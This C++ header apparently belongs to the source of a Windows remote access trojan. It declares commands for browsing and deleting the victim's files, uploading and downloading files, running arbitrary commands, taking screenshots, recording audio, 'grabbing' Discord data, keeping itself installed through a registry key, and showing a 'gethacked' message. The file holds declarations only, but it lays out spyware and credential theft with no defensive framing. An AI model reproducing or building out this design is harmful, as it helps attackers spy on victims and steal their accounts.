#ifndef COMMANDS_H
#define COMMANDS_H

#include <string>
#include <vector>
#include <cstdint>
#include <optional>

class Controller;

enum class NavigateCommand {
    ls, cd, pwd, rm
};

enum class AudioCommand {
    start, stop, list
};

enum class DiscordCommand {
    check, grab
};

enum class ShowoffCommand {
    gethacked, hi
};

// navigation.cpp
int navigation(Controller& ctrl, uint8_t cmd, const std::string path);
// files.cpp
int downloadFile(Controller& ctrl, const std::string path);
int uploadFile(Controller& ctrl, const std::string path, std::vector<uint8_t> data);
// exec.cpp
int exec(Controller& ctrl, std::string cmd, bool wait);
// screen.cpp
int screenshot(Controller& ctrl);
// audio.cpp
int audioCommand(Controller& ctrl, AudioCommand cmd);
// discord.cpp
int discordCommand(Controller& ctrl, DiscordCommand cmd);
// persistence.cpp
int persist(Controller& ctrl, const std::string regkey);
// dialog.cpp
int dialog(Controller& ctrl, uint32_t type, std::string message, std::string title);
// showoff.cpp
int showoff(Controller& ctrl, uint8_t type);
// shellexec.cpp
int shellExecute(Controller& ctrl, const std::optional<std::string> verb, const std::optional<std::string> file, const std::optional<std::string> param, const std::optional<std::string> dir, const std::optional<int> nShowCmd);

#endif